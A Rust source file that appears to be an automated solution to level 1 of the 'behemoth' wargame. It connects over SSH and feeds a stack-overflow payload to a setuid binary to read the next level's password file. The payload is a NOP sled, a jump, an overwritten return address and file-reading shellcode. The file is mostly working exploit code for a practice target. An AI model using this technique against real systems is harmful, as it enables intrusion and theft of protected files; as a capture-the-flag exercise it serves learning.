use crate::util::*;
use anyhow::Result;

/// behemoth1 is a basic stack overflow. however updates to the box (linux version, libc etc) prevent some old methods from working
/// the stack is executable: approach is fill it with nops, end with a short jump, then the overflow ret register, then shell code,
/// so execution will be hit overflow, jump back to beginning of variable stack, follow nops, jump over overflow and start shell code.
/// shellcode used just reads the target file, and is sourced from here: https://shell-storm.org/shellcode/files/shellcode-73.html
pub fn solve(password: &str) -> Result<String> {
    let session = ssh_session(super::HOST, super::PORT, "behemoth1", password)?;

    let mut channel = session.channel_session()?;
    create_shell(&mut channel)?;

    read_until(&mut channel, "behemoth1@gibson:~$ ")?;

    let nop_sled: Vec<u8> = vec![0x90; 69]; // the offset is 71 to the ret address. 71 - length of jmp is 69 (nice)
    let jmp_esp = hex_decode("eb04")?; // jmp 6 (4 + length of instruction, eb 04), used to jump over the next four bytes below
    let var_adr = hex_decode("01d5ffff")?; // 0xffffd501, approximate location in nop sled
    let file_read_shellcode = hex_decode(super::READ_FILE_SHELLCODE).unwrap();
    let file_to_read = "/etc/behemoth_pass/behemoth2".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here

    let mut full_payload: Vec<u8> = Vec::new();
    full_payload.extend(nop_sled);
    full_payload.extend(jmp_esp);
    full_payload.extend(var_adr);
    full_payload.extend(file_read_shellcode);
    full_payload.extend(file_to_read);

    let encoded = hex_encode(&full_payload);

    let target = "/behemoth/behemoth1";
    println!("running 'echo -e [payload] | {target}'");

    let cmd = format!("echo -e \"{encoded}\" | {target}");
    write_line(&mut channel, &cmd)?;

    println!("reading result");

    let result = read_until(&mut channel, "behemoth1@gibson:~$ ")?;
    let result: Vec<&str> = result.split("\n").collect();
    let result = result[result.len() - 2].trim();
    println!("retrieved behemoth2 pass '{result}'\n");

    Ok(result.to_string())
}
